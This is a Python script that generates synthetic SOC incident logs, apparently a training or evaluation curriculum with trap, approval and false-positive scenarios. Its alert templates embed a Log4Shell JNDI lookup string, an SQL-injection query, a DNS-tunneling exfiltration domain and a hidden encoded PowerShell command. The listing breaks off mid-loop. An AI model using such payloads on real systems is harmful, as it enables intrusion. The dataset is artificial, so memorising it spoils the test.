#!/usr/bin/env python3
"""
Zephyr SOC Dataset - Batch 2 Generator (v2)
Extends the existing INC-001..INC-100 dataset with INC-101..INC-500 (400 new incidents).

USAGE
    python3 generate_batch2.py
        (defaults: reads curriculum.json / asset_inventory.json from the same
        directory as this script, writes merged output to ./output/)

    python3 generate_batch2.py --curriculum /path/to/curriculum.json \
                                --inventory  /path/to/asset_inventory.json \
                                --out-dir    /path/to/output

COMPATIBILITY (unchanged from your existing pipeline)
    - curriculum.json schema: incident_id, alert_signature, source_ip, target_ip
    - asset_inventory.json:   flat dict keyed by IP -> {asset_name, criticality_tier, business_function}
    - log files: one per incident, INC-XXX_syslog.txt, [CORE]/[FILLER] tags,
      Apache-style timestamp "%d/%b/%Y:%H:%M:%S +0000"

WHAT'S NEW IN v2
    - Domain-matched pairing: each attack archetype now declares which asset
      domain(s) it makes narrative sense against (e.g. a "BACnet HVAC Override"
      signature will only ever land on an OT/building-control asset, never a
      mainframe). v1 paired archetypes with critical assets purely by tier,
      which produced mismatches like a "Infusion Pump Override" alert landing
      on a "Mainframe Batch Processor."
    - ipaddress import present (v1's `mock_env.py` bug does not apply here since
      this script only consumes IPs as strings, but kept for any future validation
      you bolt on).
    - asset_inventory merge NEVER overwrites an existing IP (prevents a later
      low-tier default silently downgrading an earlier critical-tier asset).
    - Pre-flight validation (Step 0 pattern): asserts unique IDs, correct total
      count, every new log file exists, and every log file contains [CORE].
"""
import os
import sys
import json
import random
import argparse
import ipaddress
from datetime import datetime, timedelta

random.seed(42)  # reproducible dataset; change or remove for fresh variance each run

# ==========================================
# CLI ARGS
# ==========================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR) # Points to the root directory

parser = argparse.ArgumentParser(description="Extend Zephyr SOC dataset with INC-101..INC-500")
parser.add_argument("--curriculum", default=os.path.join(ROOT_DIR, "data", "curriculum.json"),
                     help="Path to curriculum.json")
parser.add_argument("--inventory", default=os.path.join(ROOT_DIR, "app", "data", "asset_inventory.json"),
                     help="Path to asset_inventory.json")
parser.add_argument("--logs-dir", default=os.path.join(ROOT_DIR, "data", "raw_logs"),
                     help="Where to write new raw logs")
parser.add_argument("--start", type=int, default=101, help="First new incident number (default 101)")
parser.add_argument("--count", type=int, default=400, help="How many new incidents to generate (default 400)")
parser.add_argument("--seed", type=int, default=42, help="Random seed (default 42)")
args = parser.parse_args()
random.seed(args.seed)

RAW_LOGS_DIR = args.logs_dir
os.makedirs(RAW_LOGS_DIR, exist_ok=True)

# ==========================================
# LOAD EXISTING DATASET (never clobbered)
# ==========================================
if not os.path.exists(args.curriculum):
    sys.exit(f"ERROR: curriculum.json not found at {args.curriculum}. Pass --curriculum /path/to/file.")
if not os.path.exists(args.inventory):
    sys.exit(f"ERROR: asset_inventory.json not found at {args.inventory}. Pass --inventory /path/to/file.")

with open(args.curriculum) as f:
    curriculum = json.load(f)
with open(args.inventory) as f:
    asset_inventory = json.load(f)

existing_ids = {inc["incident_id"] for inc in curriculum}
print(f"Loaded {len(existing_ids)} existing incidents, {len(asset_inventory)} existing assets.")

# ==========================================
# ASSET POOLS - now tagged with a domain so archetypes only pair with
# narratively-coherent targets.
# Domains: web, ad, network, ot, medical, financial, telecom, aerospace,
#          maritime, cloud, physec, election, pki, blockchain, ai, backup,
#          mainframe, grid, water, prison, generic
# ==========================================

CRITICAL_ASSETS = [
    ("10.0.30.5",  "PKI Root Certificate Authority",              "pki"),
    ("10.0.30.6",  "Immutable Backup Vault (WORM Storage)",       "backup"),
    ("10.0.31.10", "Power Grid RTU (Substation 4)",               "grid"),
    ("10.0.31.20", "Municipal Water Chlorine Dosing Controller",  "water"),
    ("10.0.32.5",  "Dam Floodgate SCADA Controller",              "ot"),
    ("10.0.33.5",  "911 Emergency Dispatch Console",              "physec"),
    ("10.0.33.15", "Emergency Broadcast System (EAS Encoder)",    "physec"),
    ("10.0.34.5",  "Election Tabulation Server",                  "election"),
    ("10.0.35.5",  "Prison Door Control System",                  "prison"),
    ("10.0.36.5",  "Robotic Surgery Controller",                  "medical"),
    ("10.0.36.15", "Insulin Pump Telemetry Gateway",              "medical"),
    ("10.0.36.25", "Cold Chain Vaccine Freezer Monitor",          "medical"),
    ("10.0.37.5",  "Air Traffic Control Radar Feed",              "aerospace"),
    ("10.0.37.15", "Avionics FADEC Interface",                    "aerospace"),
    ("10.0.38.5",  "Maritime ECDIS Navigation System",            "maritime"),
    ("10.0.38.15", "Subsea Cable Landing Station",                "telecom"),
    ("10.0.39.5",  "Satellite Uplink Control Station",            "aerospace"),
    ("10.0.39.15", "GPS Timing Reference (Stratum-0)",            "network"),
    ("10.0.40.5",  "Drone Fleet C2 Relay",                        "aerospace"),
    ("10.0.41.5",  "SWIFT Financial Messaging Gateway",           "financial"),
    ("10.0.42.5",  "Mainframe COBOL Batch Processor",             "mainframe"),
    ("10.0.43.5",  "Blockchain Validator Node (Consensus Layer)", "blockchain"),
    ("10.0.44.5",  "AI Training Cluster (Model Weights Store)",   "ai"),
    ("10.0.45.5",  "Biometric Passport Control Kiosk",            "physec"),
    ("10.0.46.5",  "Quantum Key Distribution Ground Station",     "network"),
    ("10.0.47.5",  "Seismic Early-Warning Sensor Hub",            "ot"),
    ("10.0.48.5",  "Nuclear Plant Non-Safety Instrumentation Bus","ot"),
    ("10.0.49.5",  "Oil Pipeline Pressure Control Valve",         "ot"),
    ("10.0.0.5",   "Primary Domain Controller",                   "ad"),
    ("10.20.1.5",  "Payment Gateway Server",                      "financial"),
    ("10.0.0.20",  "Production SQL Cluster",                      "generic"),
]

NONCRITICAL_ASSETS = [
    ("10.0.60.5",  "Internal Wiki Server",              "generic"),
    ("10.0.60.15", "Marketing Landing Page CMS",         "web"),
    ("10.0.60.25", "Print Server (Floor 4)",             "generic"),
    ("10.0.61.5",  "Meeting Room Booking System",        "web"),
    ("10.0.61.15", "Employee Onboarding Portal",         "web"),
    ("10.0.62.5",  "QA Test Database",                   "generic"),
    ("10.0.62.15", "Dev Sandbox Cluster",                "cloud"),
    ("10.0.63.5",  "Cafeteria Payment Kiosk",            "generic"),
    ("10.0.63.15", "Retired Legacy Intranet App",        "web"),
    ("10.0.64.5",  "npm Registry Mirror",                "cloud"),
    ("10.0.64.15", "Interns' Shared Drive",              "generic"),
    ("10.0.65.5",  "Non-Prod Load Testing Environment",  "cloud"),
    ("10.0.65.15", "Social Media Scheduling Tool",       "web"),
    ("10.0.66.5",  "Parking Garage Gate Sensor",         "physec"),
    ("10.0.66.15", "Digital Signage Player (Lobby)",     "generic"),
]

# Authorized-but-alarming-looking internal actors, for False Positive scenarios
AUTHORIZED_SOURCES = [
    ("10.100.0.5",  "Internal Qualys Scanner",             2, "generic"),
    ("198.51.100.55","Authorized Pentest Firm",            2, "generic"),
    ("10.10.5.55",  "SRE Chaos Engineering Suite",         2, "generic"),
    ("10.0.70.5",   "Compliance Auditor Scanner",          2, "generic"),
    ("10.0.70.15",  "RMM Patch Management Agent",          2, "generic"),
    ("10.0.70.25",  "HR Background Check API Gateway",     2, "generic"),
    ("10.0.70.35",  "k6 Load Testing Runner",              3, "generic"),
    ("10.0.70.45",  "ACME Certificate Renewal Bot",        2, "pki"),
    ("10.0.70.55",  "Backup Replication Job Runner",       2, "backup"),
    ("10.0.70.65",  "Vulnerability Management Agent (Tenable)", 2, "generic"),
]

def _remap_collisions(pool, existing_inv):
    """If a pool IP already exists in the loaded asset_inventory (e.g. as a
    generic 'Unclassified Internal Endpoint' left over from an earlier batch),
    remap it to a free address in the same /24 instead of silently keeping the
    stale entry -- which is what happened to 10.0.44.5 in testing."""
    resolved = []
    for ip, *rest in pool:
        candidate = ip
        if candidate in existing_inv:
            octets = candidate.split(".")
            base = ".".join(octets[:3])
            last = int(octets[3])
            attempt = last
            for _ in range(253):
                attempt = attempt + 1 if attempt < 254 else 2
                candidate = f"{base}.{attempt}"
                if candidate not in existing_inv:
                    break
            print(f"NOTICE: {ip} already registered as '{existing_inv[ip]['asset_name']}' "
                  f"-- remapped '{rest[0]}' to {candidate}")
        resolved.append(tuple([candidate] + rest))
    return resolved

CRITICAL_ASSETS = _remap_collisions(CRITICAL_ASSETS, asset_inventory)
NONCRITICAL_ASSETS = _remap_collisions(NONCRITICAL_ASSETS, asset_inventory)
AUTHORIZED_SOURCES = _remap_collisions(AUTHORIZED_SOURCES, asset_inventory)

EXTERNAL_ROGUE_POOL = [
    "185.220.101.{}", "45.155.205.{}", "194.147.32.{}", "103.99.0.{}",
    "89.248.165.{}", "193.32.162.{}", "77.83.36.{}", "45.144.225.{}",
    "185.191.32.{}", "91.240.118.{}",
]

def random_external_ip():
    return random.choice(EXTERNAL_ROGUE_POOL).format(random.randint(2, 254))

# ==========================================
# ATTACK ARCHETYPES - now tagged with `domains` (list). When picking a critical
# target for a trap/fp scenario, we first try to match one of these domains;
# if the domain has no registered critical asset yet, we fall back to "generic".
# ==========================================

ATTACK_ARCHETYPES = [
    {"sig": "ET EXPLOIT Log4Shell RCE Variant (CVE-2021-44228)", "filler": "web", "domains": ["web", "generic"], "core": [
        '{src} - - [{ts}] "GET /?x=${{jndi:ldap://{src}/a}} HTTP/1.1" 404 0',
        '[WAF-ALERT] Log4Shell signature match from {src} targeting {tgt}.']},
    {"sig": "ET TROJAN Ransomware Extension Rename (.blackcat)", "filler": "generic", "domains": ["ad", "generic", "financial", "mainframe"], "core": [
        'SMBv2 RENAME Request: \\\\{tgt}\\shares\\finance.xlsx -> finance.xlsx.blackcat',
        '[EDR-ALERT] Mass extension rename detected on {tgt}. Source: {src}.']},
    {"sig": "ET WEB_SPECIFIC SQLi Boolean-Based Blind Attempt", "filler": "web", "domains": ["web", "generic", "financial"], "core": [
        '{src} - - [{ts}] "GET /search?q=1 AND 1=1-- HTTP/1.1" 200 512',
        '[DB-AUDIT] Anomalous boolean-blind query pattern from {src} against {tgt}.']},
    {"sig": "ET POLICY DNS Tunneling - High Entropy TXT Query", "filler": "network", "domains": ["network", "generic"], "core": [
        'DNS Query: TXT {num}.exfil.badhost.net via {tgt}',
        '[IDS-ALERT] DNS tunneling signature matched, high payload volume through {tgt}.']},
    {"sig": "ET SCAN Aggressive Internal Port Sweep", "filler": "network", "domains": ["network", "generic", "cloud"], "core": [
        'TCP SYN Sweep from {src} directed at {tgt}/24.',
        'Nmap fingerprint detected on multiple probes toward {tgt}.']},
    {"sig": "ET SCAN Credential Stuffing / Distributed Brute Force", "filler": "auth", "domains": ["ad", "web", "generic"], "core": [
        'Auth Failure burst: 80+ attempts src={src} against {tgt} in 45s',
        '[IDP-ALERT] Credential stuffing pattern detected from {src}.']},
    {"sig": "ET MALWARE C2 Beacon - Jittered HTTPS Callback", "filler": "network", "domains": ["network", "generic", "cloud"], "core": [
        'HTTPS POST to {src}:443 - Self-signed cert, JA3 hash flagged.',
        '[EDR-ALERT] Jittered beacon pattern originating from {tgt} toward {src}.']},
    {"sig": "ET POLICY Kerberoasting - RC4 Downgrade Request", "filler": "ad", "domains": ["ad"], "core": [
        'Kerberos TGS-REQ: service/MSSQLSvc@DOMAIN.LOCAL (RC4-HMAC) from {src}',
        '[IDS-ALERT] Kerberoasting attempt detected against {tgt}.']},
    {"sig": "ET POLICY Pass-the-Hash NTLM Anomaly", "filler": "ad", "domains": ["ad"], "core": [
        'SMBv2 NTLMSSP Auth: src={src} tgt={tgt} (no prior AS-REQ)',
        '[EDR-ALERT] Pass-the-Hash signature detected against {tgt}.']},
    {"sig": "ET MALWARE Obfuscated PowerShell Execution", "filler": "generic", "domains": ["generic", "ad", "mainframe"], "core": [
        'Process Execution: powershell.exe -nop -w hidden -enc <base64> on {tgt}',
        '[EDR-ALERT] Malicious PowerShell under suspicious parent process on {tgt}.']},
    {"sig": "ET MALWARE SMBv1 Worm Propagation Attempt", "filler": "ot", "domains": ["ot", "ad", "generic"], "core": [
        'SMBv1 MS17-010-class exploit payload targeting {tgt}:445.',
        '[IDS-ALERT] Worm lateral-movement attempt blocked near {tgt}.']},
    {"sig": "ET INFO Anomalous Large Outbound Transfer", "filler": "cloud", "domains": ["cloud", "generic", "financial", "ai"], "core": [
        'HTTPS GET large payload from {tgt} - Size: 2.4GB to {src}',
        '[DLP-ALERT] Anomalous mass transfer from {tgt} to {src}.']},
    {"sig": "ET TROJAN Macro-Based Document Dropper", "filler": "email", "domains": ["generic", "ad", "financial"], "core": [
        'Process Execution: WINWORD.EXE spawning cmd.exe on {tgt}',
        '[EDR-ALERT] Macro dropper execution chain detected on {tgt}.']},
    {"sig": "ET EXPLOIT ICS Modbus Unauthorized Coil Write", "filler": "ot", "domains": ["ot", "water", "grid"], "core": [
        'Modbus TCP: Write Single Coil (Function 05) on {tgt} from {src}',
        '[SCADA-ALERT] Unauthorized coil override command received at {tgt}.']},
    {"sig": "ET SCAN Meterpreter Reverse HTTPS Shell", "filler": "network", "domains": ["network", "generic", "cloud"], "core": [
        'Reverse HTTPS shell handshake between {src} and {tgt}.',
        '[IDS-ALERT] Meterpreter stager signature matched near {tgt}.']},
    {"sig": "ET COMPROMISED Tor Exit Node Communication", "filler": "network", "domains": ["network", "generic"], "core": [
        'Outbound connection from {tgt} to known Tor exit {src}.',
        '[THREAT-INTEL] {src} matches active Tor exit node list.']},
    {"sig": "ET MALWARE Credential Dumping Tool Dropped", "filler": "generic", "domains": ["ad", "generic", "mainframe"], "core": [
        'Process Execution: lsass.exe memory access from unusual handle on {tgt}',
        '[EDR-ALERT] Credential dumping tool signature on {tgt}.']},
    {"sig": "ET DOS Volumetric SYN Flood", "filler": "network", "domains": ["network", "generic", "financial", "election"], "core": [
        'SYN flood detected: {num} pkts/s from {src} toward {tgt}.',
        '[IDS-ALERT] Volumetric SYN flood targeting {tgt}.']},
    {"sig": "ET POLICY Impossible Travel Authentication", "filler": "auth", "domains": ["ad", "generic"], "core": [
        'SSO login from {src} 6000km from last login location, target {tgt}.',
        '[IDP-ALERT] Impossible-travel anomaly flagged for account on {tgt}.']},
    {"sig": "ET EXPLOIT Struts2 OGNL Injection RCE (CVE-2023-50164)", "filler": "web", "domains": ["web", "generic", "financial"], "core": [
        '{src} - - [{ts}] "POST /upload HTTP/1.1" 500 0 - OGNL payload detected',
        '[WAF-ALERT] Struts2 OGNL injection ({cve}) from {src} toward {tgt}.']},
    {"sig": "ET EXPLOIT Zero-Day Shellcode Pattern (Unclassified)", "filler": "network", "domains": ["network", "generic", "cloud", "ai", "mainframe"], "core": [
        'Raw shellcode-like byte pattern observed in traffic from {src} to {tgt}.',
        '[IDS-ALERT] Unclassified exploit signature - manual triage required for {tgt}.']},
    {"sig": "ET EXPLOIT AWS IMDS SSRF Attempt", "filler": "cloud", "domains": ["cloud", "ai"], "core": [
        '{src} - - [{ts}] "GET /latest/meta-data/ HTTP/1.1" 200 812 via {tgt}',
        '[CLOUD-ALERT] SSRF-to-IMDS pattern detected from {tgt}.']},
    {"sig": "ET MALWARE Destructive Wiper - Mass Service Stop", "filler": "generic", "domains": ["generic", "ad", "mainframe", "financial"], "core": [
        'Mass service termination detected on {tgt} (34 services stopped in 12s).',
        '[EDR-ALERT] Wiper-class destructive behavior on {tgt}.']},
    {"sig": "ET EXPLOIT Kernel Module Load - Possible Rootkit", "filler": "generic", "domains": ["generic", "ai", "cloud"], "core": [
        'Unsigned kernel module loaded on {tgt}: modname=hideproc.ko',
        '[EDR-ALERT] Rootkit-class kernel module behavior on {tgt}.']},
    {"sig": "ET POLICY Cryptocoin Miner Stratum Protocol", "filler": "network", "domains": ["generic", "cloud", "ai"], "core": [
        'Stratum protocol handshake from {tgt} to {src}:3333',
        '[IDS-ALERT] Cryptomining pool connection from {tgt}.']},
    {"sig": "ET NET BGP Route Anomaly (Possible Hijack)", "filler": "network", "domains": ["network", "telecom"], "core": [
        'Unexpected AS-path change observed for prefix owned by {tgt}.',
        '[NET-ALERT] BGP anomaly involving {tgt}, origin {src}.']},
    {"sig": "ET WIRELESS Rogue Access Point Detected", "filler": "generic", "domains": ["generic", "network"], "core": [
        'Rogue AP beacon detected, SSID spoofing corporate network near {tgt}.',
        '[WIDS-ALERT] Evil-twin AP flagged near {tgt}.']},
    {"sig": "ET POLICY Golden SAML Token Forgery Indicator", "filler": "ad", "domains": ["ad"], "core": [
        'Anomalous SAML assertion signed offline, issued for {tgt}.',
        '[IDP-ALERT] Golden SAML indicator detected involving {tgt}.']},
    {"sig": "ET PHISHING Malicious Attachment Delivered", "filler": "email", "domains": ["generic", "ad", "financial"], "core": [
        'Email with macro-enabled attachment delivered to user on {tgt}.',
        '[SEG-ALERT] Phishing payload matched known campaign, target {tgt}.']},
    {"sig": "ET INFO Suspicious Steganographic Payload in Upload", "filler": "web", "domains": ["web", "generic"], "core": [
        'Uploaded image to {tgt} contains trailing data past EOF marker.',
        '[DLP-ALERT] Possible steganographic exfil channel via {tgt}.']},
    {"sig": "ET POLICY Suspicious WMI Remote Execution", "filler": "ad", "domains": ["ad", "mainframe"], "core": [
        'WMI process creation via wmic.exe /node:{tgt} from {src}',
        '[EDR-ALERT] Remote WMI execution against {tgt}.']},
    {"sig": "ET INFO ICMP Tunneling / Covert Channel", "filler": "network", "domains": ["network", "generic"], "core": [
        'Oversized ICMP echo payloads observed between {src} and {tgt}.',
        '[IDS-ALERT] Possible ICMP covert channel involving {tgt}.']},
    {"sig": "ET MALWARE Cron Job Reverse Shell Persistence", "filler": "generic", "domains": ["generic", "cloud", "mainframe"], "core": [
        'Crontab modification on {tgt} adds outbound reverse shell entry.',
        '[EDR-ALERT] Persistence via cron detected on {tgt}.']},
    {"sig": "ET EXPLOIT DNS Rebinding Toward Internal Service", "filler": "network", "domains": ["network", "cloud"], "core": [
        'DNS response TTL=0 rebinding {src} to internal address for {tgt}.',
        '[IDS-ALERT] DNS rebinding attempt targeting {tgt}.']},
    {"sig": "ET IOT Unauthorized Firmware Push via TFTP", "filler": "ot", "domains": ["ot", "grid", "water"], "core": [
        'Unauthenticated TFTP write of firmware image to {tgt}.',
        '[SCADA-ALERT] Unauthorized firmware push detected on {tgt}.']},
    {"sig": "ET CLOUD Anomalous Mass Data Export via OAuth", "filler": "cloud", "domains": ["cloud", "generic"], "core": [
        'OAuth app requested full-mailbox export scope for tenant on {tgt}.',
        '[CLOUD-ALERT] Mass export via OAuth token flagged for {tgt}.']},
    {"sig": "ET NET DNS Amplification Reflection Attack", "filler": "network", "domains": ["network"], "core": [
        'Oversized DNS responses (>4000B) reflected through {tgt}.',
        '[NET-ALERT] Amplification attack pattern involving {tgt}.']},
    {"sig": "ET POLICY AD Schema Modification - Deleted Object Reanimation", "filler": "ad", "domains": ["ad"], "core": [
        'Tombstoned AD object reanimated on {tgt} by unexpected principal.',
        '[IDP-ALERT] Schema-level AD anomaly on {tgt}.']},
    {"sig": "ET TELECOM SS7 Location Interrogation Spoofing", "filler": "network", "domains": ["telecom"], "core": [
        'SS7 ATI request spoofing subscriber location toward {tgt}.',
        '[TELECOM-ALERT] SS7 spoofing indicator involving {tgt}.']},
    {"sig": "ET IOT Unauthorized BACnet Write Command", "filler": "ot", "domains": ["ot", "physec"], "core": [
        'BACnet WriteProperty command altering setpoint on {tgt}.',
        '[SCADA-ALERT] Unauthorized BACnet write against {tgt}.']},
    {"sig": "ET WEB3 Smart Contract Reentrancy Pattern", "filler": "generic", "domains": ["blockchain"], "core": [
        'Reentrant call sequence detected in contract linked to {tgt}.',
        '[CHAIN-ALERT] Reentrancy exploit pattern against {tgt}.']},
    {"sig": "ET AI Vector Database Poisoning Attempt", "filler": "generic", "domains": ["ai"], "core": [
        'Anomalous embedding insertion batch targeting {tgt} from {src}.',
        '[ML-ALERT] Possible poisoning of vector index on {tgt}.']},
    {"sig": "ET EXPLOIT PCIe DMA Unauthorized Access", "filler": "generic", "domains": ["generic"], "core": [
        'Unauthorized Thunderbolt/PCIe DMA access attempt on {tgt}.',
        '[EDR-ALERT] DMA attack indicator on {tgt}.']},
    {"sig": "ET NET TCP Sequence Replay Attack", "filler": "network", "domains": ["network"], "core": [
        'Duplicate TCP stream with mismatched sequence replayed toward {tgt}.',
        '[NET-ALERT] Replay attack pattern involving {tgt}.']},
    {"sig": "ET EXPLOIT Satellite Uplink Command Injection", "filler": "network", "domains": ["aerospace"], "core": [
        'Malformed TT&C command frame received at {tgt} from {src}.',
        '[SATCOM-ALERT] Unauthorized uplink command attempt on {tgt}.']},
    {"sig": "ET EXPLOIT Maritime ECDIS GPS Spoofing Indicator", "filler": "network", "domains": ["maritime"], "core": [
        'Discontinuous GPS position jump reported by {tgt}.',
        '[MARITIME-ALERT] Possible GPS spoofing affecting {tgt}.']},
    {"sig": "ET MALWARE Avionics Interface Anomalous Write", "filler": "ot", "domains": ["aerospace"], "core": [
        'Unexpected parameter write to FADEC bus on {tgt} from {src}.',
        '[AVSEC-ALERT] Anomalous avionics bus write on {tgt}.']},
    {"sig": "ET MEDICAL Infusion Pump Parameter Override", "filler": "ot", "domains": ["medical"], "core": [
        'Remote dosage parameter change pushed to {tgt} from {src}.',
        '[MEDDEV-ALERT] Unauthorized infusion parameter override on {tgt}.']},
    {"sig": "ET MEDICAL Cold Chain Monitor Setpoint Tampering", "filler": "ot", "domains": ["medical"], "core": [
        'Freezer setpoint changed remotely on {tgt} from {src}.',
        '[MEDDEV-ALERT] Cold-chain tampering indicator on {tgt}.']},
    {"sig": "ET FINANCE SWIFT Message Field Tampering", "filler": "db", "domains": ["financial"], "core": [
        'MT103 message field altered in transit near {tgt}.',
        '[FIN-ALERT] SWIFT message integrity anomaly on {tgt}.']},
    {"sig": "ET LEGACY Mainframe Batch Job Unauthorized Modification", "filler": "db", "domains": ["mainframe"], "core": [
        'JCL batch job modified outside change window on {tgt}.',
        '[MAINFRAME-ALERT] Unauthorized batch modification on {tgt}.']},
    {"sig": "ET CHAIN Validator Node Consensus Deviation", "filler": "generic", "domains": ["blockchain"], "core": [
        'Consensus vote deviation observed from validator {tgt}.',
        '[CHAIN-ALERT] Possible validator compromise at {tgt}.']},
    {"sig": "ET PHYSEC Prison Door Controller Unauthorized Command", "filler": "ot", "domains": ["prison"], "core": [
        'Unlock command issued to {tgt} outside scheduled routine.',
        '[PHYSEC-ALERT] Unauthorized door-control command at {tgt}.']},
    {"sig": "ET PHYSEC Dam Floodgate Setpoint Change", "filler": "ot", "domains": ["ot"], "core": [
        'Floodgate actuator setpoint changed remotely at {tgt} from {src}.',
        '[SCADA-ALERT] Unauthorized floodgate command at {tgt}.']},
    {"sig": "ET GRID Substation RTU Unauthorized Breaker Command", "filler": "ot", "domains": ["grid"], "core": [
        'Breaker open/close command issued to {tgt} from unrecognized source {src}.',
        '[GRID-ALERT] Unauthorized RTU command at {tgt}.']},
    {"sig": "ET WATER Chlorine Dosing Setpoint Manipulation", "filler": "ot", "domains": ["water"], "core": [
        'Dosing rate setpoint changed remotely on {tgt} from {src}.',
        '[SCADA-ALERT] Water treatment tampering indicator on {tgt}.']},
    {"sig": "ET ELECTION Tabulation Server Anomalous Access", "filler": "db", "domains": ["election"], "core": [
        'Off-hours administrative login to {tgt} from {src}.',
        '[ELECTION-ALERT] Anomalous access to tabulation system {tgt}.']},
    {"sig": "ET PKI Root CA Unauthorized Certificate Issuance", "filler": "generic", "domains": ["pki"], "core": [
        'Certificate issued from {tgt} outside approved issuance workflow.',
        '[PKI-ALERT] Unauthorized issuance event on Root CA {tgt}.']},
    {"sig": "ET BACKUP Immutable Vault Deletion Attempt", "filler": "db", "domains": ["backup"], "core": [
        'Delete API call rejected by WORM lock on {tgt}, retried 40x from {src}.',
        '[BACKUP-ALERT] Repeated deletion attempts against immutable vault {tgt}.']},
    {"sig": "ET AEROSPACE Drone Fleet C2 Relay Hijack Attempt", "filler": "network", "domains": ["aerospace"], "core": [
        'Unauthorized command frames injected toward {tgt} from {src}.',
        '[UAV-ALERT] Possible C2 relay hijack at {tgt}.']},
]

FP_JUSTIFICATIONS = [
    '[CHANGE-MGMT] Ticket CHG-{num} approved: scheduled activity authorized by CISO office.',
    '[CHANGE-MGMT] Maintenance window MW-{num} covers this activity through 06:00 UTC.',
    '[COMPLIANCE] Activity matches signed SOW for Q3 authorized security assessment #{num}.',
    '[RUNBOOK] Automated remediation runbook RB-{num} executed as scheduled.',
]

def register_asset(ip, name, tier, inventory):
    if ip in inventory:
        return  # never overwrite an existing entry
    inventory[ip] = {
        "asset_name": name,
        "criticality_tier": tier,
        "business_function": f"Auto-Registered {name}",
    }

def pick_critical_asset(domains):
    """Pick a critical asset whose domain matches the archetype; fall back to
    'generic' tier-1 assets if no domain-specific critical asset exists."""
    matches = [a for a in CRITICAL_ASSETS if a[2] in domains]
    pool = matches if matches else [a for a in CRITICAL_ASSETS if a[2] == "generic"]
    return random.choice(pool)

def pick_noncritical_asset(domains):
    matches = [a for a in NONCRITICAL_ASSETS if a[2] in domains]
    pool = matches if matches else NONCRITICAL_ASSETS
    return random.choice(pool)

NONCRITICAL_DOMAINS = set(a[2] for a in NONCRITICAL_ASSETS)

def pick_archetype(require_noncritical_compatible=False):
    """When require_noncritical_compatible=True, only pick archetypes that have
    a genuine non-critical counterpart domain (e.g. no 'non-critical chlorine
    dosing controller' exists, so water/medical/aerospace/etc-only archetypes
    are excluded from approval/fp-noncritical branches rather than forced onto
    a mismatched generic asset)."""
    if require_noncritical_compatible:
        candidates = [a for a in ATTACK_ARCHETYPES if any(d in NONCRITICAL_DOMAINS for d in a["domains"])]
    else:
        candidates = ATTACK_ARCHETYPES
    return random.choice(candidates)

def get_filler(filler_type, ts, src, tgt):
    templates = {
        "web": [
            f'[FILLER] {src} - - [{ts}] "GET /assets/main.js HTTP/1.1" 200 812',
            f'[FILLER] {src} - - [{ts}] "GET /api/v1/health HTTP/1.1" 200 45',
            f'[FILLER] {tgt} - - [{ts}] "GET /favicon.ico HTTP/1.1" 200 312',
        ],
        "ad": [
            f'[FILLER] {src} - - [{ts}] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)',
            f'[FILLER] {tgt} - - [{ts}] LDAP Search Request: Base="DC=domain,DC=local"',
        ],
        "cloud": [
            f'[FILLER] CloudTrail [{ts}]: AssumeRole called by app-tier role near {tgt}',
            f'[FILLER] ALB-Log [{ts}]: {src} TLSv1.3 200',
        ],
        "ot": [
            f'[FILLER] SCADA-Telemetry [{ts}]: Register read success on {tgt}',
            f'[FILLER] Historian [{ts}]: Tag_Update_Success - Node_{tgt}',
        ],
        "network": [
            f'[FILLER] NetFlow [{ts}]: TCP {src}:54312 -> {tgt}:443 (14 packets)',
            f'[FILLER] Firewall [{ts}]: PERMIT TCP {src} -> {tgt}:80 (Rule: Allow_Web)',
        ],
        "auth": [
            f'[FILLER] Okta-Log [{ts}]: SUCCESS user=jdoe IP={src}',
            f'[FILLER] VPN-Log [{ts}]: IKEv2 SA established with {src}',
        ],
        "db": [
            f'[FILLER] SQL-Audit [{ts}]: SELECT * FROM status_table WHERE active=1',
            f'[FILLER] Postgres [{ts}]: LOG duration: 3.1ms statement: COMMIT',
        ],
        "email": [
            f'[FILLER] Exchange [{ts}]: Message Delivered (Subject: "Weekly Digest")',
            f'[FILLER] Proofpoint [{ts}]: Inbound email clean. SPF=Pass DKIM=Pass',
        ],
        "generic": [
            f'[FILLER] Sysmon [{ts}]: Process Create: conhost.exe on {tgt}',
            f'[FILLER] Splunk-UF [{ts}]: Forwarding 90 events to indexer.',
        ],
    }
    choices = templates.get(filler_type, templates["generic"])
    return random.choice(choices)

# ==========================================
# MAIN GENERATION
# ==========================================

scenario_counts = {"trap": args.count // 2, "approval": args.count // 4}
scenario_counts["fp"] = args.count - scenario_counts["trap"] - scenario_counts["approval"]
scenario_types = (["trap"] * scenario_counts["trap"]
                   + ["approval"] * scenario_counts["approval"]
                   + ["fp"] * scenario_counts["fp"])
random.shuffle(scenario_types)

base_time = datetime(2026, 9, 14, 8, 0, 0)
new_curriculum = []

for offset, scenario in enumerate(scenario_types):
    inc_num = args.start + offset
    inc_id = f"INC-{inc_num:03d}"
    cve = f"CVE-2024-{random.randint(10000,49999)}"
    port = random.choice([22, 80, 443, 445, 3389, 502, 3333, 8080])
    num = random.randint(1000, 9999)

    if scenario == "trap":
        archetype = pick_archetype(require_noncritical_compatible=False)
        tgt_ip, tgt_name, _ = pick_critical_asset(archetype["domains"])
        src_ip = random_external_ip() if random.random() < 0.5 else f"10.0.{random.randint(90,99)}.{random.randint(2,254)}"
        register_asset(tgt_ip, tgt_name, 1, asset_inventory)
        core_templates = list(archetype["core"])
    elif scenario == "approval":
        archetype = pick_archetype(require_noncritical_compatible=True)
        src_ip = random_external_ip()
        tgt_ip, tgt_name, _ = pick_noncritical_asset(archetype["domains"])
        register_asset(tgt_ip, tgt_name, random.choice([2, 3]), asset_inventory)
        core_templates = list(archetype["core"])
    else:  # false positive
        critical_branch = random.random() < 0.5
        archetype = pick_archetype(require_noncritical_compatible=not critical_branch)
        src_ip, src_name, src_tier, _ = random.choice(AUTHORIZED_SOURCES)
        register_asset(src_ip, src_name, src_tier, asset_inventory)
        if critical_branch:
            tgt_ip, tgt_name, _ = pick_critical_asset(archetype["domains"])
            register_asset(tgt_ip, tgt_name, 1, asset_inventory)
        else:
            tgt_ip, tgt_name, _ = pick_noncritical_asset(archetype["domains"])
            register_asset(tgt_ip, tgt_name, random.choice([2, 3]), asset_inventory)
        core_templates = list(archetype["core"]) + [random.choice(FP_JUSTIFICATIONS)]

    new_curriculum.append({
        "incident_id": inc_id,
        "alert_signature": archetype["sig"].format(cve=cve) if "{cve}" in archetype["sig"] else archetype["sig"],
        "source_ip": src_ip,
        "target_ip": tgt_ip,
    })

    # --- write syslog file ---
    log_path = os.path.join(RAW_LOGS_DIR, f"{inc_id}_syslog.txt")
